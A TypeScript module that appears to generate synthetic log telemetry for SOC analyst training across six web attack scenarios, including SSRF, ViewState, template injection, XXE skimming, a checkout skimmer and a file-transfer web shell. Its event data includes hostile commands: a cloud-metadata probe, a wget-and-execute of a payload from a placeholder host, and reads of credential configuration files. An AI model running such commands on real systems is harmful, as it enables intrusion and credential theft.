/**
 * Web application attack stories, part 2: advanced chains (Team Training only).
 *
 * 1. web-ssrf-cloud-metadata: SSRF to the instance metadata service, role credentials used from
 *    outside (the Capital One pattern). AWS only: CloudTrail and GuardDuty are the second half.
 * 2. web-viewstate-machinekey: a forged ViewState signed with a known ASP.NET machine key (Microsoft,
 *    February 2025). Bound to IIS on Windows.
 * 3. web-template-injection-wiki: template injection in an internet-facing wiki, CVE-2023-22527 class.
 *    Bound to nginx in front of a Java process on Linux.
 * 4. web-xxe-store-skimmer: XXE reads a store's secret key, a forged API token edits a CMS block on the
 *    checkout page (the CosmicSting pattern, CVE-2024-34102).
 * 5. web-checkout-skimmer: a stolen admin sign-in edits a checkout script (the Magecart pattern).
 * 6. web-mft-sqli-shell: managed file transfer exploited through SQL injection, a web shell named after
 *    a real page (MOVEit Transfer, CVE-2023-34362). Bound to IIS on Windows.
 *
 * Exploit content never appears: an attack URL is a textbook probe or a placeholder, the logs show the effect.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { cloudTrailEvent, guardDutyFinding } from "@/lib/sim/emitters/cloudtrail";
import { csFile, csNetwork, csProcess } from "@/lib/sim/emitters/crowdstrike";
import { mdeProcess } from "@/lib/sim/emitters/mde";
import { panWeb } from "@/lib/sim/emitters/paloalto";
import { wafRequest, webAccess, type WebSite } from "@/lib/sim/emitters/web";
import { makeSha256 } from "@/lib/sim/iocs";
import { makeCtx } from "@/lib/logs/native/ctx";
import { asUser, bytesText, clock, ticket, type WebStoryDef } from "./entry";

const IA = "Initial Access", CRED = "Credential Access", EXEC = "Execution", PERSIST = "Persistence", C2 = "Command and Control", COLLECT = "Collection", DISC = "Discovery", IMPACT = "Impact", EXFIL = "Exfiltration";
const CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
const SCANNER = "Mozilla/5.0 (compatible; ASV-Scanner/9.6; +https://scanner.example/about)";
const IPHONE = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1";

// ══════════════════════════════════════════════════════════════════════════════
// 1. SSRF to the cloud metadata service
// ══════════════════════════════════════════════════════════════════════════════
function ssrfMetadata(): TelemetryEvent[] {
  const T = clock("2026-09-22T06:00:00Z");
  const w: WebSite = { site: "app.rocketstack.io", host: "web-app-01.rocketstack.io", ip: "172.16.40.21" };
  const atk = "203.0.113.17", cloudIp = "203.0.113.111", ua = "python-requests/2.31.0", cli = "aws-cli/2.17.20 Python/3.12.4 Linux/6.8.0";
  const accountId = makeCtx("rocketstack").tenant.awsAccountId;
  const role = "app-web-instance-role", session = "i-0a1b2c3d4e5f60718", key = "ASIAIOSFODNN7EXAMPLE";
  const arn = `arn:aws:sts::${accountId}:assumed-role/${role}/${session}`;
  const bucket = "rocketstack-customer-exports";
  const actor = { accountId, actorType: "AssumedRole" as const, arn, accessKeyId: key, sessionIssuerName: role, region: "eu-west-1" };
  const p = "/api/preview";
  return [
    ticket({ id: "web_ss_001", ts: T(0), table: "change_request", number: "CHG0044301", state: "Implement", severity: "informational",
      shortDescription: "External ASV vulnerability scan of public sites, source 198.51.100.201", description: "ServiceNow change CHG0044301 (Implement): external vulnerability scan of public sites" }),
    wafRequest(w, { id: "web_ss_002", ts: T(5), srcIp: "198.51.100.201", path: p, query: "url=http://169.254.169.254/latest/meta-data/", action: "block", rule: "ssrf_query", matched: "169.254.169.254", location: "ARGS:url", ua: SCANNER, severity: "high", isDetection: true, mitre: "T1190", tactic: IA, verdict: "fp",
      fpExplanation: "The approved external scan under CHG0044301: its address and user agent match the change, and it stopped at the block.", description: "WAF rule matched an address in the url parameter of /api/preview" }),
    webAccess(w, { id: "web_ss_003", ts: T(12), srcIp: "198.51.100.17", path: p, query: "url=https://cdn.partner.example/logo.png", bytes: 20412, ua: CHROME, isBaseline: true, description: "Application answered a link preview" }),
    { ...cloudTrailEvent({ id: "web_ss_004", ts: T(18), ...actor, srcIp: w.ip, eventName: "GetObject", eventSource: "s3.amazonaws.com", s3Bucket: "rocketstack-app-assets", s3Key: "previews/config.json", userAgent: "aws-sdk-php/3.316.0", readOnly: true, severity: "informational", description: "Application role read an object from its own bucket" }), is_baseline: true },
    wafRequest(w, { id: "web_ss_005", ts: T(61), srcIp: atk, path: p, query: "url=http://169.254.169.254/latest/meta-data/", action: "block", rule: "ssrf_query", matched: "169.254.169.254", location: "ARGS:url", ua, severity: "high", isDetection: true, mitre: "T1190", tactic: IA, description: "WAF rule matched an address in the url parameter of /api/preview" }),
    wafRequest(w, { id: "web_ss_006", ts: T(63), srcIp: atk, path: p, query: "url=https://img.static-files.example/r1.png", action: "allow", ua, bytes: 1312, description: "WAF passed a request to /api/preview" }),
    webAccess(w, { id: "web_ss_007", ts: T(63), srcIp: atk, path: p, query: "url=https://img.static-files.example/r1.png", bytes: 1312, ua, mitre: "T1190", tactic: IA, description: "Application answered a link preview" }),
    webAccess(w, { id: "web_ss_008", ts: T(64), srcIp: atk, path: p, query: "url=https://img.static-files.example/r2.png", bytes: 1518, ua, mitre: "T1552.005", tactic: CRED, severity: "medium", description: "Application answered a link preview" }),
    cloudTrailEvent({ id: "web_ss_009", ts: T(69), ...actor, srcIp: cloudIp, eventName: "GetCallerIdentity", eventSource: "sts.amazonaws.com", userAgent: cli, readOnly: true, mitre: "T1078.004", tactic: IA, severity: "medium", description: "Role session called GetCallerIdentity" }),
    cloudTrailEvent({ id: "web_ss_011", ts: T(70.5), ...actor, srcIp: cloudIp, eventName: "ListBuckets", eventSource: "s3.amazonaws.com", userAgent: cli, readOnly: true, mitre: "T1530", tactic: COLLECT, severity: "medium", description: "Role session called ListBuckets" }),
    cloudTrailEvent({ id: "web_ss_012", ts: T(73), ...actor, srcIp: cloudIp, eventName: "GetObject", eventSource: "s3.amazonaws.com", s3Bucket: bucket, s3Key: "2026/q3/customers-full.csv.gz", bytes: 214880113, userAgent: cli, readOnly: true, mitre: "T1530", tactic: COLLECT, severity: "high", description: "Role session read an object from an export bucket" }),
    guardDutyFinding({ id: "web_ss_010", ts: T(76), findingType: "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS", gdSeverity: 8, title: "Credentials for an EC2 instance role used from an external IP address", srcIp: cloudIp, api: "ListBuckets", serviceName: "s3.amazonaws.com", callerType: "Remote IP", resourceType: "AccessKey", userType: "AssumedRole", userName: role, accessKeyId: key, accountId, region: "eu-west-1", mitre: "T1552.005", tactic: CRED, severity: "high", description: "GuardDuty raised a finding on an instance role" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 2. Insecure deserialization: forged ViewState on IIS
// ══════════════════════════════════════════════════════════════════════════════
function viewState(): TelemetryEvent[] {
  const T = clock("2026-09-23T11:00:00Z");
  const w: WebSite = { site: "partners.nexacorp.com", host: "web-partners-01.nexacorp.com", ip: "10.20.40.81", server: "iis" };
  const atk = "203.0.113.125", ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0", c2 = "198.51.100.83";
  const host = { host: w.host, user: null, srcIp: w.ip };
  const POOL = { runAsUser: "IIS APPPOOL\\Partners", accountName: "Partners", accountDomain: "IIS APPPOOL" };
  const W3WP = { parentName: "w3wp.exe", parentPid: 6128 };
  const cmd = (id: string, min: number, pid: number, cmdline: string, extra = {}) => mdeProcess({ id, ts: T(min), ...host, ...POOL, ...W3WP, processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe", cmdline, pid,
    sha256: makeSha256("windows_system32_cmd_exe_signed_microsoft"), signed: true, integrity: "High", description: `Process started on ${w.host}`, ...extra });
  return [
    wafRequest(w, { id: "web_vs_001", ts: T(8), srcIp: "198.51.100.141", method: "POST", path: "/Orders/Edit.aspx", action: "count", rule: "size_body", ua: CHROME, sent: 21408, bytes: 41290, severity: "low", mitre: "T1190", tactic: IA, verdict: "fp",
      fpExplanation: "A partner saving a long order form: an ordinary page of the application, its large hidden fields are normal for it, and nothing follows on the host.", description: "WAF rule evaluated a large request body" }),
    webAccess(w, { id: "web_vs_002", ts: T(8), srcIp: "198.51.100.141", method: "POST", path: "/Orders/Edit.aspx", sent: 21408, bytes: 41290, ua: CHROME, isBaseline: true, description: "Web server answered a form post" }),
    wafRequest(w, { id: "web_vs_004", ts: T(71), srcIp: atk, method: "POST", path: "/Login.aspx", action: "count", rule: "size_body", ua, sent: 12884, bytes: 412, severity: "low", mitre: "T1190", tactic: IA, description: "WAF rule evaluated a large request body" }),
    webAccess(w, { id: "web_vs_005", ts: T(71), srcIp: atk, method: "POST", path: "/Login.aspx", sent: 12884, bytes: 412, ua, mitre: "T1190", tactic: IA, description: "Web server answered a form post (12,884 bytes in, 412 bytes out)" }),
    webAccess(w, { id: "web_vs_007", ts: T(73), srcIp: atk, method: "POST", path: "/Login.aspx", sent: 2240, bytes: 318, ua, mitre: "T1505.003", tactic: PERSIST, description: "Web server answered a form post (2,240 bytes in, 318 bytes out)" }),
    cmd("web_vs_008", 73.1, 7044, "cmd.exe /c whoami", { isDetection: true, mitre: "T1059.003", tactic: EXEC, severity: "high" }),
    cmd("web_vs_009", 74, 7112, "cmd.exe /c ipconfig /all", { mitre: "T1016", tactic: DISC, severity: "medium" }),
    cmd("web_vs_010", 76, 7188, "cmd.exe /c type C:\\inetpub\\partners\\web.config", { mitre: "T1552.001", tactic: CRED, severity: "medium" }),
    webAccess(w, { id: "web_vs_011", ts: T(76), srcIp: atk, method: "POST", path: "/Login.aspx", sent: 2312, bytes: 6840, ua, mitre: "T1552.001", tactic: CRED, description: "Web server answered a form post (2,312 bytes in, 6,840 bytes out)" }),
    asUser(csNetwork({ id: "web_vs_012", ts: T(79), ...host, remoteIp: c2, remotePort: 443, application: "tls", processName: "w3wp.exe", processPath: "C:\\Windows\\System32\\inetsrv\\w3wp.exe", cmdline: "w3wp.exe -ap Partners", pid: 6128, mitre: "T1071.001", tactic: C2, severity: "medium", description: `Outbound connection from ${w.host}` }), POOL.runAsUser),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 3. Template injection in an internet-facing wiki (CVE-2023-22527 class)
// ══════════════════════════════════════════════════════════════════════════════
function wikiTemplate(): TelemetryEvent[] {
  const T = clock("2026-09-24T02:00:00Z");
  const w: WebSite = { site: "wiki.nexacorp.com", host: "web-wiki-01.nexacorp.com", ip: "10.20.40.91", server: "nginx", wafMode: "Detection" };
  const atk = "198.51.100.33", ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", mirror = "pkg.update-mirror.example", c2 = "198.51.100.34";
  const vm = "/template/aui/text-inline.vm", java = { parentName: "java", parentPid: 3120 };
  const home = "/var/atlassian/application-data/confluence", payload = makeSha256("wiki_tmp_cfg_payload");
  const host = { host: w.host, user: null, srcIp: w.ip };
  const child = (id: string, min: number, pid: number, cmdline: string, name = "dash", path = "/usr/bin/dash", extra = {}) => csProcess({ id, ts: T(min), ...host, ...java, processName: name, processPath: path, cmdline, pid, runAsUser: "confluence",
    sha256: makeSha256(`wiki_${name}`), description: `Process started on ${w.host}`, ...extra });
  return [
    ticket({ id: "web_tm_001", ts: T(0), table: "change_request", number: "CHG0044340", state: "Implement", severity: "informational",
      shortDescription: "External ASV vulnerability scan of public sites, source 198.51.100.202", description: "ServiceNow change CHG0044340 (Implement): external vulnerability scan of public sites" }),
    wafRequest(w, { id: "web_tm_002", ts: T(6), srcIp: "198.51.100.202", method: "POST", path: vm, action: "count", rule: "java_body", matched: "java.lang.Runtime", location: "REQUEST_BODY", ua: SCANNER, bytes: 1040, severity: "high", isDetection: true, mitre: "T1190", tactic: IA, verdict: "fp",
      fpExplanation: "The approved external scan under CHG0044340, testing for the published flaw: its address and user agent match the change, and no process followed on the server.", description: "WAF rule matched Java class names in a request to a template path" }),
    webAccess(w, { id: "web_tm_011", ts: T(6), srcIp: "198.51.100.202", method: "POST", path: vm, bytes: 1040, ua: SCANNER, isBaseline: true, description: "Wiki answered a request to a template path" }),
    wafRequest(w, { id: "web_tm_003", ts: T(94), srcIp: atk, method: "POST", path: vm, action: "count", rule: "java_body", matched: "java.lang.Runtime", location: "REQUEST_BODY", ua, bytes: 1812, severity: "high", isDetection: true, mitre: "T1190", tactic: IA, description: "WAF rule matched Java class names in a request to a template path" }),
    webAccess(w, { id: "web_tm_004", ts: T(94), srcIp: atk, method: "POST", path: vm, bytes: 1812, sent: 1432, ua, mitre: "T1190", tactic: IA, description: "Wiki answered a request to a template path" }),
    child("web_tm_005", 94.1, 40211, "sh -c whoami", "dash", "/usr/bin/dash", { isDetection: true, severity: "high", mitre: "T1059.004", tactic: EXEC }),
    child("web_tm_006", 96, 40277, `sh -c wget -q https://${mirror}/a -O /tmp/.cfg && chmod +x /tmp/.cfg`, "dash", "/usr/bin/dash", { severity: "medium", mitre: "T1105", tactic: C2 }),
    panWeb({ id: "web_tm_007", ts: T(96), host: w.host, user: null, srcIp: w.ip, url: `https://${mirror}/a`, domain: mirror, dstIp: "198.51.100.35", category: "unknown", action: "alert", userAgent: "Wget/1.21.4", bytesIn: 3127844, severity: "medium", mitre: "T1105", tactic: C2, description: "Server downloaded a file from an uncategorized domain" }),
    child("web_tm_012", 97.8, 40298, "sh -c /tmp/.cfg", "dash", "/usr/bin/dash", { severity: "medium", mitre: "T1059.004", tactic: EXEC }),
    csProcess({ id: "web_tm_013", ts: T(97.9), ...host, processName: ".cfg", processPath: "/tmp/.cfg", cmdline: "/tmp/.cfg", pid: 40302, parentName: "dash", parentPid: 40298, runAsUser: "confluence", sha256: payload, severity: "medium", mitre: "T1059.004", tactic: EXEC, description: `Process started on ${w.host}` }),
    asUser(csNetwork({ id: "web_tm_008", ts: T(98), ...host, remoteIp: c2, remotePort: 443, processName: ".cfg", processPath: "/tmp/.cfg", cmdline: "/tmp/.cfg", pid: 40302, parentName: "dash", parentPid: 40298, sha256: payload, mitre: "T1071.001", tactic: C2, severity: "medium", description: `Outbound connection from ${w.host}` }), "confluence"),
    child("web_tm_009", 112, 40391, `sh -c cat ${home}/confluence.cfg.xml`, "dash", "/usr/bin/dash", { severity: "medium", mitre: "T1552.001", tactic: CRED }),
    child("web_tm_010", 116, 40420, `sh -c tar czf /tmp/.a.tgz ${home}/attachments`, "dash", "/usr/bin/dash", { severity: "medium", mitre: "T1213", tactic: COLLECT }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 4. XXE to a stolen store key, then a skimmer in a CMS block (CVE-2024-34102 class)
// ══════════════════════════════════════════════════════════════════════════════
function xxeSkimmer(): TelemetryEvent[] {
  const T = clock("2026-09-28T15:00:00Z");
  // Adobe Commerce runs on Linux behind nginx: Windows and IIS are not supported.
  const w: WebSite = { site: "store.nexacorp.com", host: "web-store-01.nexacorp.com", ip: "10.20.40.101", server: "nginx" };
  const atk = "198.51.100.13", ua = "python-httpx/0.27.0", ship = "/rest/V1/guest-carts/4f7a1c92e6b0483d9a51c07e2b6d8f13/estimate-shipping-methods";
  const drop = "assets-cdn.example", dropIp = "198.51.100.32", rule = "XmlDoctypeInRequestBody";
  return [
    ticket({ id: "web_xx_001", ts: T(0), table: "sc_req_item", number: "RITM0052203", state: "Closed Complete", severity: "informational",
      shortDescription: "ERP order feed posts XML with a DOCTYPE to the store API from 198.51.100.143", description: "ServiceNow request RITM0052203 (Closed Complete): ERP order feed to the store API" }),
    wafRequest(w, { id: "web_xx_002", ts: T(7), srcIp: "198.51.100.143", method: "POST", path: "/rest/V1/orders/import", action: "count", rule: "custom", ruleName: rule, matched: "<!DOCTYPE", location: "REQUEST_BODY", ua: "ERP-Connector/7.4", severity: "high", isDetection: true, mitre: "T1190", tactic: IA, verdict: "fp",
      fpExplanation: "The ERP order feed in RITM0052203: its XML carries a DOCTYPE by design, from its registered address, on its own import path, and the store makes no outbound request.", description: "Custom rule matched a DOCTYPE declaration in a request body" }),
    webAccess(w, { id: "web_xx_003", ts: T(20), srcIp: "198.51.100.18", method: "POST", path: ship, bytes: 412, ua: CHROME, isBaseline: true, description: "Store API answered a shipping estimate" }),
    webAccess(w, { id: "web_xx_013", ts: T(30), srcIp: "198.51.100.19", path: "/checkout", bytes: 61880, ua: CHROME, isBaseline: true, description: "Store answered a checkout page" }),
    wafRequest(w, { id: "web_xx_004", ts: T(66), srcIp: atk, method: "POST", path: ship, action: "count", rule: "custom", ruleName: rule, matched: "<!DOCTYPE", location: "REQUEST_BODY", ua, sent: 2210, bytes: 412, severity: "high", isDetection: true, mitre: "T1190", tactic: IA, description: "Custom rule matched a DOCTYPE declaration in a request body" }),
    webAccess(w, { id: "web_xx_005", ts: T(66), srcIp: atk, method: "POST", path: ship, bytes: 412, sent: 2210, ua, mitre: "T1190", tactic: IA, description: "Store API answered a shipping estimate" }),
    panWeb({ id: "web_xx_011", ts: T(66.1), host: w.host, user: null, srcIp: w.ip, url: `http://${drop}:8888/dtd.xml`, domain: drop, dstIp: dropIp, category: "unknown", action: "alert", bytesIn: 318, severity: "medium", mitre: "T1552.001", tactic: CRED, description: "Server requested a file from an uncategorized domain" }),
    panWeb({ id: "web_xx_012", ts: T(66.2), host: w.host, user: null, srcIp: w.ip, url: `http://${drop}:8888/c?d=7b2263727970`, domain: drop, dstIp: dropIp, category: "unknown", action: "alert", bytesOut: 2840, severity: "medium", mitre: "T1552.001", tactic: CRED, description: "Server requested a file from an uncategorized domain" }),
    webAccess(w, { id: "web_xx_006", ts: T(91), srcIp: atk, path: "/rest/V1/store/storeConfigs", bytes: 2204, ua, mitre: "T1078", tactic: IA, description: "Store API answered an admin request" }),
    webAccess(w, { id: "web_xx_007", ts: T(93), srcIp: atk, path: "/rest/V1/customers/search", query: "searchCriteria%5BpageSize%5D=200", bytes: 7214880, ua, mitre: "T1213", tactic: COLLECT, severity: "medium", description: "Store API answered an admin request" }),
    webAccess(w, { id: "web_xx_008", ts: T(97), srcIp: atk, method: "PUT", path: "/rest/V1/cmsBlock/41", bytes: 1840, sent: 3122, ua, mitre: "T1565.001", tactic: IMPACT, severity: "medium", description: "Store API answered a content change" }),
    webAccess(w, { id: "web_xx_009", ts: T(104), srcIp: "198.51.100.26", path: "/checkout", bytes: 64112, ua: IPHONE, isBaseline: true, description: "Store answered a checkout page" }),
    { ...ticket({ id: "web_xx_010", ts: T(640), table: "incident", number: "INC0092017", state: "New", severity: "medium", shortDescription: "Card issuer reports fraud on cards used at the online store", description: "ServiceNow incident INC0092017 (New): card issuer fraud report for the online store" }), is_baseline: undefined, mitre_technique: "T1056.003", mitre_tactic: COLLECT },
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 5. Client-side skimmer written into a checkout script
// ══════════════════════════════════════════════════════════════════════════════
function checkoutSkimmer(): TelemetryEvent[] {
  const T = clock("2026-09-29T09:00:00Z");
  const w: WebSite = { site: "pay.nexacorp.com", host: "web-pay-01.nexacorp.com", ip: "10.20.40.111", server: "nginx" };
  const atk = "203.0.113.132", ua = CHROME, js = "/assets/js/checkout.min.js", app = "/assets/js/app.min.js", path = `/var/www/pay/public${js}`;
  const host = { host: w.host, user: null, srcIp: w.ip };
  const buyer = "198.51.100.20", phone = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36";
  const size = (id: string, min: number, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: buyer, path: js, bytes, ua: phone, referer: "https://pay.nexacorp.com/checkout", description: "Payment site answered a script request", ...extra });
  return [
    ticket({ id: "web_sk_001", ts: T(0), table: "change_request", number: "CHG0044377", state: "Implement", severity: "informational",
      shortDescription: "Payment site release 4.18, deploy by the deployer service", description: "ServiceNow change CHG0044377 (Implement): payment site release 4.18" }),
    { ...csFile({ id: "web_sk_002", ts: T(11), ...host, path: `/var/www/pay/public${app}`, action: "file_modify", size: 91204, sha256: makeSha256("app_418_release"), actorProcess: "rsync", actorPath: "/usr/bin/rsync", actorPid: 11840, runAsUser: "deployer", severity: "high", isDetection: true, mitre: "T1565.001", tactic: IMPACT, description: `File changed under the web root on ${w.host}` }), expected_verdict: "fp" as const,
      fp_explanation: "The approved release under CHG0044377: the deployer service wrote a script of the release with rsync." },
    { ...size("web_sk_003", 13, 48211), is_baseline: true },
    webAccess(w, { id: "web_sk_004", ts: T(208), srcIp: atk, method: "POST", path: "/admin/login", status: 302, bytes: 0, ua, mitre: "T1078", tactic: IA, description: "Payment site answered an admin sign-in" }),
    wafRequest(w, { id: "web_sk_005", ts: T(211), srcIp: atk, method: "POST", path: "/admin/theme/assets", query: "file=js/checkout.min.js", action: "count", rule: "size_body", ua, sent: 50377, bytes: 244, severity: "low", mitre: "T1565.001", tactic: IMPACT, description: "WAF rule evaluated a large request body" }),
    webAccess(w, { id: "web_sk_006", ts: T(211), srcIp: atk, method: "POST", path: "/admin/theme/assets", query: "file=js/checkout.min.js", bytes: 244, sent: 50377, ua, mitre: "T1565.001", tactic: IMPACT, description: "Payment site answered a theme file save" }),
    csFile({ id: "web_sk_007", ts: T(211), ...host, path, action: "file_modify", size: 50377, sha256: makeSha256("checkout_418_changed"), actorProcess: "php-fpm8.2", actorPath: "/usr/sbin/php-fpm8.2", actorPid: 14022, runAsUser: "www-data", severity: "high", isDetection: true, mitre: "T1565.001", tactic: IMPACT, description: `File changed under the web root on ${w.host}` }),
    size("web_sk_008", 225.9, 50377, { srcIp: "198.51.100.21", ua: CHROME, mitre: "T1056.003", tactic: COLLECT }),
    webAccess(w, { id: "web_sk_009", ts: T(226), srcIp: "198.51.100.21", method: "POST", path: "/csp-report", status: 204, bytes: 0, sent: 781, ua: CHROME, referer: "https://pay.nexacorp.com/checkout", mitre: "T1056.003", tactic: COLLECT, description: "Payment site answered a browser policy report" }),
    { ...ticket({ id: "web_sk_010", ts: T(1320), table: "incident", number: "INC0092144", state: "New", severity: "medium", shortDescription: "Customers report card fraud after paying on the website", description: "ServiceNow incident INC0092144 (New): customers report card fraud after paying online" }), is_baseline: undefined, mitre_technique: "T1056.003", mitre_tactic: COLLECT },
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 6. Managed file transfer exploited by a named CVE class (CVE-2023-34362), logs only
// ══════════════════════════════════════════════════════════════════════════════
function mftShell(): TelemetryEvent[] {
  const T = clock("2026-09-30T22:00:00Z");
  const w: WebSite = { site: "files.nexacorp.com", host: "web-files-01.nexacorp.com", ip: "10.20.40.121", server: "iis" };
  const atk = "198.51.100.91", ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
  const host = { host: w.host, user: null, srcIp: w.ip };
  const root = "C:\\MOVEitTransfer\\wwwroot", pool = "IIS APPPOOL\\moveitdmz pool", W3WP = "C:\\Windows\\System32\\inetsrv\\w3wp.exe";
  const worker = { actorProcess: "w3wp.exe", actorPath: W3WP, actorPid: 4716, runAsUser: pool };
  const page = (id: string, min: number, status: number, bytes: number, mitre: string, tactic: string, severity: "medium" | "high") =>
    webAccess(w, { id, ts: T(min), srcIp: atk, path: "/human2.aspx", status, bytes, ua, mitre, tactic, severity, description: `File transfer site answered a page request (status ${status}, ${bytesText(bytes)} bytes out)` });
  return [
    ticket({ id: "web_mf_012", ts: T(0), table: "change_request", number: "CHG0044402", state: "Implement", severity: "informational",
      shortDescription: "File transfer server hotfix, installer run by the platform team", description: "ServiceNow change CHG0044402 (Implement): file transfer server hotfix" }),
    webAccess(w, { id: "web_mf_001", ts: T(4), srcIp: "198.51.100.144", path: "/human.aspx", bytes: 21440, ua: CHROME, isBaseline: true, description: "File transfer site answered its sign-in page" }),
    webAccess(w, { id: "web_mf_002", ts: T(9), srcIp: "198.51.100.144", method: "POST", path: "/guestaccess.aspx", bytes: 8120, ua: CHROME, verdict: "fp", severity: "low",
      fpExplanation: "A guest opening a package a colleague sent: one POST from a browser, no API call follows from the address, and no new file appears on the server.", description: "File transfer site answered a guest access page" }),
    { ...csFile({ id: "web_mf_013", ts: T(38), ...host, path: `${root}\\human.aspx`, sha256: makeSha256("web_mft_hotfix_page"), size: 6480, actorProcess: "msiexec.exe", actorPath: "C:\\Windows\\System32\\msiexec.exe", actorPid: 3312, runAsUser: "NT AUTHORITY\\SYSTEM", mitre: "T1505.003", tactic: PERSIST, severity: "high", isDetection: true, description: `File written under the web root on ${w.host}` }), expected_verdict: "fp" as const,
      fp_explanation: "The approved hotfix under CHG0044402: the installer replaced the site's own page, and no compiler or web request from outside goes with the write." },
    webAccess(w, { id: "web_mf_003", ts: T(121), srcIp: atk, method: "POST", path: "/guestaccess.aspx", bytes: 2214, ua, mitre: "T1190", tactic: IA, description: "File transfer site answered a guest access page" }),
    webAccess(w, { id: "web_mf_004", ts: T(121.2), srcIp: atk, method: "POST", path: "/api/v1/token", bytes: 1180, ua, mitre: "T1190", tactic: IA, description: "File transfer API answered a token request" }),
    webAccess(w, { id: "web_mf_005", ts: T(121.6), srcIp: atk, path: "/api/v1/folders", bytes: 640, ua, mitre: "T1190", tactic: IA, description: "File transfer API answered a folder list" }),
    webAccess(w, { id: "web_mf_006", ts: T(122), srcIp: "::1", method: "POST", path: "/machine2.aspx", port: 80, bytes: 318, ua: "-", mitre: "T1190", tactic: IA, description: "File transfer site answered a page request" }),
    webAccess(w, { id: "web_mf_014", ts: T(122.1), srcIp: atk, method: "POST", path: "/moveitisapi/moveitisapi.dll", query: "action=m2", bytes: 412, ua, mitre: "T1190", tactic: IA, description: "File transfer site answered a page request" }),
    mdeProcess({ id: "web_mf_015", ts: T(122.5), ...host, runAsUser: pool, accountName: "moveitdmz pool", accountDomain: "IIS APPPOOL", parentName: "w3wp.exe", parentPid: 4716, processName: "csc.exe", processPath: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe", cmdline: "csc.exe /noconfig /fullpaths @\"C:\\Windows\\TEMP\\f3kq1v.cmdline\"", pid: 5108,
      sha256: makeSha256("windows_microsoft_net_csc_exe_signed_microsoft"), signed: true, integrity: "High", mitre: "T1505.003", tactic: PERSIST, severity: "medium", description: `Process started on ${w.host}` }),
    csFile({ id: "web_mf_007", ts: T(122.6), ...host, path: `${root}\\human2.aspx`, sha256: makeSha256("web_mft_shell_page"), size: 5212, ...worker, mitre: "T1505.003", tactic: PERSIST, severity: "high", isDetection: true, description: `File written under the web root on ${w.host}` }),
    page("web_mf_008", 123, 404, 1245, "T1505.003", PERSIST, "medium"),
    page("web_mf_009", 131, 200, 22184, "T1083", DISC, "medium"),
    page("web_mf_010", 152, 200, 412882160, "T1041", EXFIL, "high"),
    page("web_mf_011", 171, 200, 1288042871, "T1041", EXFIL, "high"),
  ];
}


export const WEB_ADVANCED_STORIES: WebStoryDef[] = [
  { id: "web-ssrf-cloud-metadata", title: "Link Preview Feature and an Instance Role Used From Outside", complexity: "advanced", events: ssrfMetadata() },
  { id: "web-viewstate-machinekey", title: "Partner Portal Worker Process Runs Commands", complexity: "advanced", events: viewState() },
  { id: "web-template-injection-wiki", title: "Internet-Facing Wiki Server Exploited (CVE-2023-22527 Class)", complexity: "advanced", events: wikiTemplate() },
  // A hospital and a bank run no online store with a card checkout.
  { id: "web-xxe-store-skimmer", title: "Store Shipping API and a Changed Content Block", complexity: "advanced", events: xxeSkimmer(), companies: ["nexacorp", "rocketstack", "globallogis"] },
  { id: "web-checkout-skimmer", title: "Checkout Script Changed Outside a Release", complexity: "advanced", events: checkoutSkimmer() },
  { id: "web-mft-sqli-shell", title: "Managed File Transfer Server Exploited (CVE-2023-34362 Class)", complexity: "advanced", events: mftShell() },
];
